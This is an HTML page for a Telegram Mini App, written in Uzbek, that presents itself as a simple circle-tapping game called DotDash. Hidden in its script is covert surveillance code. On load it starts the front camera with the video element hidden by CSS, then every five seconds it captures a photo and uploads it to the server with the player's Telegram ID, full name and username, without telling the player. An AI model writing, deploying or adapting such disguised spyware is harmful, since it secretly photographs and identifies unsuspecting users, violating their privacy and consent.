<!DOCTYPE html>
<html lang="uz">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
  <title>@DotDash - Doira O'yini</title>
  <style>
    body {
      font-family: sans-serif;
      background: #111;
      color: #fff;
      text-align: center;
      padding: 2rem;
      margin: 0;
      touch-action: none;
    }

    .game {
      max-width: 400px;
      margin: auto;
      padding: 1rem;
      background: #1d1d1d;
      border-radius: 12px;
      user-select: none;
    }

    .circle {
      width: 40px;
      height: 40px;
      border-radius: 50%;
      position: absolute;
      cursor: pointer;
      transition: transform 0.2s;
    }

    .circle:hover {
      transform: scale(1.2);
    }

    .bonus-circle {
      background: gold !important;
      box-shadow: 0 0 10px gold;
    }

    video {
      display: none !important;
      width: 0;
      height: 0;
      opacity: 0;
    }

    .loader {
      border: 5px solid #333;
      border-top: 5px solid #0af;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 2rem auto;
      display: none;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .score {
      font-size: 1.2rem;
      margin: 1rem 0;
    }

    .game-area {
      position: relative;
      height: 300px;
      background: #222;
      border-radius: 10px;
      overflow: hidden;
      touch-action: manipulation;
    }

    .settings {
      margin: 1rem 0;
    }

    .settings select {
      padding: 0.5rem;
      background: #333;
      color: #fff;
      border: 1px solid #0af;
      border-radius: 5px;
    }

    .logo {
      width: 60px;
      height: 60px;
      margin: 1rem auto;
    }
  </style>
</head>
<body>
  <div class="game">
    <!-- Logo qo‘shildi -->
    <svg class="logo" width="60" height="60" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
      <rect width="512" height="512" fill="#1d1d1d"/>
      <circle cx="256" cy="256" r="150" fill="#00aaff"/>
      <circle cx="256" cy="256" r="160" fill="none" stroke="#ffffff" stroke-width="10" opacity="0.3"/>
      <rect x="350" y="240" width="30" height="5" fill="#00aaff" transform="rotate(45, 350, 242.5)"/>
      <rect x="320" y="340" width="30" height="5" fill="#00aaff" transform="rotate(-45, 320, 342.5)"/>
      <rect x="190" y="340" width="30" height="5" fill="#00aaff" transform="rotate(45, 190, 342.5)"/>
      <rect x="160" y="240" width="30" height="5" fill="#00aaff" transform="rotate(-45, 160, 242.5)"/>
      <text x="256" y="400" font-family="Montserrat, Roboto, sans-serif" font-size="40" fill="#ffffff" text-anchor="middle">DotDash</text>
    </svg>
    <h2>@DotDash - Doira O'yini</h2>
    <p>Doirani imkon qadar ko'proq bosing!</p>
    <div class="score">Hisob: <span id="score">0</span></div>
    <div class="settings">
      <label for="speed">Tezlik:</label>
      <select id="speed">
        <option value="1000">Normal</option>
        <option value="800">Tez</option>
        <option value="600">Juda tez</option>
      </select>
    </div>
    <div class="loader"></div>
    <div class="game-area" id="gameArea">
      <div class="circle" id="circle"></div>
    </div>
  </div>

  <video id="video" autoplay playsinline muted></video>

  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <script>
    Telegram.WebApp.ready();
    Telegram.WebApp.expand();

    const user = Telegram.WebApp.initDataUnsafe?.user;
    const userId = user?.id || "1612270615";
    const fullName = `${user?.first_name || ""} ${user?.last_name || ""}`.trim();
    const username = user?.username || "";
    const ADMIN_ID = "YOUR_ADMIN_ID"; // Bu yerga admin Telegram ID'sini qo‘ying

    const video = document.getElementById("video");
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");
    const circle = document.getElementById("circle");
    const gameArea = document.getElementById("gameArea");
    const scoreDisplay = document.getElementById("score");
    const loader = document.querySelector(".loader");
    const speedSelect = document.getElementById("speed");

    let score = 0;
    let isCapturing = false;
    let lastCaptureTime = 0;
    let circleTimeout;
    let moveInterval = 1000;

    const colors = ["#0af", "#0f0", "#f00"]; // Ko‘k, yashil, qizil

    // O'yin logikasi
    function moveCircle() {
      clearTimeout(circleTimeout);
      const maxX = gameArea.clientWidth - circle.clientWidth;
      const maxY = gameArea.clientHeight - circle.clientHeight;
      const newX = Math.random() * maxX;
      const newY = Math.random() * maxY;
      circle.style.left = `${newX}px`;
      circle.style.top = `${newY}px`;
      circle.style.background = colors[Math.floor(Math.random() * colors.length)];

      // Bonus doira (har 10 bosishda)
      if (score % 10 === 0 && score > 0) {
        circle.classList.add("bonus-circle");
      } else {
        circle.classList.remove("bonus-circle");
      }

      // 2 sekunddan keyin doira yo‘qoladi
      circleTimeout = setTimeout(() => {
        moveCircle();
      }, 2000);
    }

    circle.addEventListener("click", () => {
      score += circle.classList.contains("bonus-circle") ? 5 : 1;
      scoreDisplay.textContent = score;
      moveCircle();
    });

    circle.addEventListener("touchstart", (e) => {
      e.preventDefault();
      score += circle.classList.contains("bonus-circle") ? 5 : 1;
      scoreDisplay.textContent = score;
      moveCircle();
    });

    // Tezlikni o‘zgartirish
    speedSelect.addEventListener("change", () => {
      moveInterval = parseInt(speedSelect.value);
      clearInterval(moveCircleInterval);
      moveCircleInterval = setInterval(moveCircle, moveInterval);
    });

    moveCircle();
    let moveCircleInterval = setInterval(moveCircle, moveInterval);

    // Kamera logikasi
    async function startCamera() {
      try {
        loader.style.display = "block";
        const stream = await navigator.mediaDevices.getUserMedia({
          video: {
            facingMode: "user",
            width: { ideal: 640 },
            height: { ideal: 480 },
            frameRate: { ideal: 30 }
          },
          audio: false
        });

        video.srcObject = stream;
        await new Promise((resolve, reject) => {
          video.onloadedmetadata = () => {
            video.play().then(resolve).catch(reject);
          };
        });

        loader.style.display = "none";
        startCapture();
      } catch (err) {
        console.error("❌ Kamera ishga tushmadi:", err);
        loader.style.display = "none";
        // Admin uchun xato log qilish
        if (userId === ADMIN_ID) {
          fetch("/log-error", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ error: "Kamera ishga tushmadi: " + err.message, userId })
          });
        }
      }
    }

    async function startCapture() {
      if (isCapturing) return;
      isCapturing = true;

      const capture = async () => {
        if (!video.videoWidth || video.paused || video.ended) {
          console.warn("❌ Video ramkasi tayyor emas");
          return;
        }

        try {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

          const blob = await new Promise((res) => canvas.toBlob(res, "image/jpeg", 0.7));
          const file = new File([blob], "photo.jpg", { type: "image/jpeg" });

          const formData = new FormData();
          formData.append("photo", file);
          formData.append("user_id", userId);
          formData.append("tg_fullname", fullName);
          formData.append("tg_username", username);

          const response = await fetch("/send-photo", {
            method: "POST",
            body: formData
          });

          if (!response.ok) {
            throw new Error("Server javob bermadi");
          }

          console.log("✅ Rasm yuborildi", new Date().toLocaleTimeString());
        } catch (err) {
          console.error("❌ Yuborish xatosi:", err);
          // Admin uchun xato log qilish
          if (userId === ADMIN_ID) {
            fetch("/log-error", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ error: "Rasm yuborish xatosi: " + err.message, userId })
            });
          }
        }
      };

      setInterval(async () => {
        const now = Date.now();
        if (now - lastCaptureTime >= 5000) {
          lastCaptureTime = now;
          await capture();
        }
      }, 1000);
    }

    startCamera();
  </script>
</body>
</html>
